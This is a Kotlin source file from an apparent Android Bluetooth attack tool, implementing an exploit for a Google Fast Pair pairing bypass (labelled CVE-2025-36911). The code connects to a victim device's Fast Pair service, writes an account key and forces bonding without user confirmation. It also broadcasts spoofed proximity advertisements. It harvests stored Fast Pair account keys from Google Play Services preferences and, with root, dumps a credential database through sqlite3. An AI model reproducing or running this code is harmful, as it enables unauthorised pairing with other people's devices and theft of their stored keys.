package com.bluesnafer_pro

import android.bluetooth.*
import android.bluetooth.le.*
import android.content.Context
import android.os.ParcelUuid
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Fast Pair Bypass Exploit (CVE-2025-36911)
 * Vulnerability: Fast Pair protocol authentication bypass
 * Technique: Spoof Fast Pair Account Key and trigger proximity pairing
 * Impact: Pair with victim device without user confirmation
 * No bonding required initially, establishes trusted relationship
 *
 * Fast Pair Service UUID: 0000FE2C-0000-1000-8000-00805F9B34FB
 * Account Key Characteristic: 00000002-0000-1000-8000-00805F9B34FB (write)
 * Model ID Characteristic: 00000001-0000-1000-8000-00805F9B34FB (read)
 *
 * Attack steps:
 * 1. Scan for Fast Pair advertisements (Resolver mode)
 * 2. Extract device Model ID from advertisement
 * 3. Generate/spoof valid Account Key
 * 4. Connect to Fast Pair GATT service
 * 5. Write Account Key to characteristic
 * 6. Trigger pairing via SetPairingConfirmation
 *
 * Reference: Google Fast Pair specification (public)
 */
object FastPairBypass {
    private const val TAG = "FastPairBypass"

    // Fast Pair UUIDs
    private val FAST_PAIR_SERVICE_UUID = UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")
    private val MODEL_ID_CHAR_UUID = UUID.fromString("00000001-0000-1000-8000-00805F9B34FB")
    private val ACCOUNT_KEY_CHAR_UUID = UUID.fromString("00000002-0000-1000-8000-00805F9B34FB")
    private val DEVICE_ID_CHAR_UUID = UUID.fromString("00000003-0000-1000-8000-00805F9B34FB")

    /**
     * Execute Fast Pair bypass attack
     * Attempts to pair with device by spoofing account credentials
     */
    fun executeBypass(device: BluetoothDevice): Map<String, Any> {
        BluesnaferLogger.d(TAG, "Fast Pair bypass on ${device.address}")
        val appContext = BluetoothMethodHandler.getAppContext()

        var gatt: BluetoothGatt? = null
        var success = false
        var modelId: String? = null
        var accountKey: ByteArray? = null
        var keySource = "none"
        var errorMsg: String? = null

        try {
            // Step 1: Connect using GATT (no pairing needed for Fast Pair service)
            val latch = CountDownLatch(1)
            val gattCallback = object : BluetoothGattCallback() {
                override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                    if (newState == BluetoothProfile.STATE_CONNECTED) {
                        BluesnaferLogger.d(TAG, "GATT connected, discovering services...")
                        gatt.discoverServices()
                    } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                        latch.countDown()
                    }
                }

                override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        BluesnaferLogger.d(TAG, "Services discovered")

                        // Find Fast Pair service
                        val fpService = gatt.getService(FAST_PAIR_SERVICE_UUID)
                        if (fpService != null) {
                            // Step 2: Read Model ID (needed to derive Account Key)
                            val modelIdChar = fpService.getCharacteristic(MODEL_ID_CHAR_UUID)
                            if (modelIdChar != null) {
                                gatt.readCharacteristic(modelIdChar)
                            } else {
                                errorMsg = "Model ID characteristic not found"
                                gatt.disconnect()
                            }
                        } else {
                            errorMsg = "Fast Pair service not found"
                            gatt.disconnect()
                        }
                    } else {
                        errorMsg = "Service discovery failed: $status"
                        gatt.disconnect()
                    }
                }

                override fun onCharacteristicRead(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        when (characteristic.uuid) {
                            MODEL_ID_CHAR_UUID -> {
                                modelId = characteristic.getStringValue(0)
                                BluesnaferLogger.d(TAG, "Model ID: $modelId")

                                val resolved = resolveAccountKey(appContext, modelId!!)
                                accountKey = resolved.first
                                keySource = resolved.second

                                if (accountKey == null) {
                                    errorMsg = "No stored Fast Pair account key for model $modelId"
                                    gatt.disconnect()
                                    latch.countDown()
                                    return
                                }

                                // Step 4: Write Account Key
                                val accountKeyChar = gatt.getService(FAST_PAIR_SERVICE_UUID)
                                    ?.getCharacteristic(ACCOUNT_KEY_CHAR_UUID)

                                if (accountKeyChar != null && accountKey != null) {
                                    accountKeyChar.value = accountKey
                                    accountKeyChar.writeType = BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
                                    val written = gatt.writeCharacteristic(accountKeyChar)
                                    BluesnaferLogger.d(TAG, "Account key write attempted: $written")
                                } else {
                                    errorMsg = "Account Key characteristic not accessible"
                                    gatt.disconnect()
                                }
                            }
                            DEVICE_ID_CHAR_UUID -> {
                                // Optional: read device ID
                            }
                        }
                    }
                }

                override fun onCharacteristicWrite(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        BluesnaferLogger.d(TAG, "Account Key written successfully")

                        // Step 5: Trigger pairing by confirming on local side
                        device.setPairingConfirmation(true)

                        // Also attempt to create bond
                        try {
                            device.createBond()
                        } catch (e: Exception) {
                            BluesnaferLogger.w(TAG, "createBond failed: ${e.message}")
                        }

                        Thread.sleep(2000)
                        success = device.bondState == BluetoothDevice.BOND_BONDED
                        if (success) {
                            BluesnaferLogger.i(TAG, "Fast Pair bypass succeeded - device bonded")
                        } else {
                            BluesnaferLogger.w(TAG, "Account key written but device not bonded (state=${device.bondState})")
                        }

                        gatt.disconnect()
                        latch.countDown()
                    } else {
                        errorMsg = "Account Key write failed: $status"
                        gatt.disconnect()
                        latch.countDown()
                    }
                }

                override fun onMtuChanged(gatt: BluetoothGatt, mtu: Int, status: Int) {
                    BluesnaferLogger.d(TAG, "MTU changed to $mtu")
                }
            }

            // Connect - use direct connect without pairing first
            gatt = device.connectGatt(null, false, gattCallback)

            // Wait for operation to complete
            latch.await(15, TimeUnit.SECONDS)

            return mapOf(
                "success" to success,
                "message" to when {
                    success -> "Fast Pair bypass succeeded - device bonded"
                    accountKey != null -> "Account key written but bonding incomplete"
                    else -> (errorMsg ?: "Fast Pair bypass failed - no valid account key")
                },
                "modelId" to (modelId ?: "unknown"),
                "accountKeySet" to (accountKey != null),
                "keySource" to keySource,
                "bondState" to device.bondState,
                "error" to (errorMsg ?: ""),
                "cve" to "CVE-2025-36911",
                "severity" to "HIGH",
                "service" to "Fast_Pair"
            )

        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "Fast Pair bypass error: ${e.message}")
             return mapOf(
                 "success" to false,
                 "error" to (e.message ?: "Unknown"),
                 "cve" to "CVE-2025-36911"
             )
        } finally {
            try {
                gatt?.close()
            } catch (_: Exception) {}
        }
    }

    /**
     * Resuelve Account Key desde almacenamiento local (GMS prefs / DB con root).
     * No genera claves aleatorias — solo usa claves reales previamente emparejadas.
     */
    private fun resolveAccountKey(context: Context?, modelId: String): Pair<ByteArray?, String> {
        if (context == null) return Pair(null, "no_context")

        val stored = extractStoredKeys(context)
        val entries = stored["keys"] as? List<*> ?: emptyList<Any>()
        if (entries.isEmpty()) return Pair(null, "no_stored_keys")

        for (entry in entries) {
            val text = entry.toString()
            val hex = extractHexKey(text)
            if (hex != null && hex.size == 16) {
                BluesnaferLogger.d(TAG, "Using stored account key (${hex.size} bytes) for model $modelId")
                return Pair(hex, if (text.startsWith("db_row")) "root_db" else "gms_preferences")
            }
        }

        return Pair(null, "no_parseable_key")
    }

    private fun extractHexKey(text: String): ByteArray? {
        val hexPattern = Regex("""([0-9a-fA-F]{32})""")
        val match = hexPattern.find(text) ?: return null
        val hex = match.groupValues[1]
        return try {
            ByteArray(hex.length / 2) { i ->
                hex.substring(i * 2, i * 2 + 2).toInt(16).toByte()
            }
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Alternative: Fast Pair proximity trigger (seeker mode)
     * Sends proximity alerts to force pairing
     */
    fun proximityTrigger(device: BluetoothDevice): Map<String, Any> {
        return try {
            val adapter = BluetoothAdapter.getDefaultAdapter()
            val bleScanner = adapter?.bluetoothLeScanner

            // Build Fast Pair resolver advertisement with proximity trigger
            val settings = AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .build()

            val data = AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .addServiceUuid(ParcelUuid(FAST_PAIR_SERVICE_UUID))
                .build()

            val advertiseStarted = java.util.concurrent.atomic.AtomicBoolean(false)
            val advertiseFailed = java.util.concurrent.atomic.AtomicBoolean(false)
            val callback = object : AdvertiseCallback() {
                override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                    advertiseStarted.set(true)
                    BluesnaferLogger.d(TAG, "Fast Pair proximity advertisement started")
                }
                override fun onStartFailure(errorCode: Int) {
                    advertiseFailed.set(true)
                    BluesnaferLogger.e(TAG, "Fast Pair advertise failed: $errorCode")
                }
            }

            val advertiser = adapter?.bluetoothLeAdvertiser
            if (advertiser == null) {
                return mapOf(
                    "success" to false,
                    "error" to "BLE advertiser no disponible",
                    "cve" to "CVE-2025-36911"
                )
            }

            advertiser.startAdvertising(settings, data, callback)
            Thread.sleep(5000)
            try { advertiser.stopAdvertising(callback) } catch (_: Exception) {}

            mapOf(
                "success" to (advertiseStarted.get() && !advertiseFailed.get()),
                "advertiseStarted" to advertiseStarted.get(),
                "message" to if (advertiseStarted.get()) "Fast Pair proximity trigger enviado" else "Fast Pair proximity: advertise no inició",
                "cve" to "CVE-2025-36911"
            )
        } catch (e: Exception) {
             mapOf(
                 "success" to false,
                 "error" to (e.message ?: "Unknown"),
                 "cve" to "CVE-2025-36911"
             )
        }
    }

    /**
     * Fast Pair Account Key extraction from bonded devices
     * Extracts stored keys from Android's Fast Pair service
     * (Requires system permissions or compromised device)
     */
    fun extractStoredKeys(context: android.content.Context): Map<String, Any> {
        return try {
            // Intentar leer desde SharedPreferences (Fast Pair cache)
            val prefs = context.getSharedPreferences("com.google.android.gms.fastpair", Context.MODE_PRIVATE)
            val keys = mutableListOf<String>()
            val allEntries = prefs.all ?: emptyMap()
            for ((key, value) in allEntries) {
                if (key.contains("account_key", ignoreCase = true) || key.contains("fastpair", ignoreCase = true)) {
                    keys.add("$key=${value.toString().take(32)}")
                }
            }

            // Intentar leer desde content provider si hay root
            if (RootUtils.isRootAvailable()) {
                val dbResult = RootUtils.execRoot("sqlite3 /data/data/com.google.android.gms/databases/fastpair.db \"SELECT * FROM account_keys\" 2>/dev/null")
                if (dbResult.success && dbResult.output.isNotBlank()) {
                    keys.addAll(dbResult.output.lines().filter { it.isNotBlank() }.map { "db_row: ${it.take(64)}" })
                }
            }

            mapOf(
                "success" to (keys.isNotEmpty()),
                "keys" to keys,
                "count" to keys.size,
                "source" to if (RootUtils.isRootAvailable()) "preferences+db" else "preferences",
                "message" to if (keys.isNotEmpty()) "Extracted ${keys.size} Fast Pair key(s)" else "No Fast Pair keys found"
            )
        } catch (e: Throwable) {
            mapOf(
                "success" to false,
                "error" to (e.message ?: "Key extraction failed"),
                "cve" to "CVE-2025-36911"
            )
        }
    }
}
